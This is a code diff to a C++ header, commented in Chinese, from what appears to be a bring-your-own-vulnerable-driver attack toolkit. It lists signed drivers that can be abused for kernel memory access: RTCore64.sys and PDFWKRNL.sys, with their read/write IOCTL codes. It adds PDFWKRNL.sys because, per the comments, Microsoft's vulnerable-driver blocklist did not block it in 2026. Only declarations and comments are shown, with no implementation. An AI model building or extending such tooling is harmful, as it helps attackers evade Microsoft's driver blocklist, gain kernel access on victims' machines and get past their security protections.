@@ -85,9 +85,15 @@ struct BYOVDDriverInfo {
 };
 
 namespace BYOVDDrivers {
-    // RTCore64.sys — MSI Afterburner (唯一嵌入驱动)
-    // 暴露: 任意物理/虚拟内存 R/W via IOCTL 0xC3502580 / 0xC3502588
+    // RTCore64.sys — MSI Afterburner (嵌入驱动)
+    // 暴露: 任意物理/虚拟内存 R/W via IOCTL 0x80002048/0x4C
+    // 注意: Win11 2026 可能因证书吊销阻止加载
     extern const BYOVDDriverInfo RTCore64;
+
+    // ★ BUILD 489: PDFWKRNL.sys — AMD PDF Worker (替代驱动)
+    // 暴露: 内核VA memcpy R/W via IOCTL 0x80002014 (METHOD_BUFFERED)
+    // 优势: 2026年未被 Microsoft 漏洞驱动阻止列表拦截
+    extern const BYOVDDriverInfo PDFWKRNL;
 
     // 获取所有可用驱动候选列表 (已排优先级)
     const BYOVDDriverInfo* GetAllCandidates();
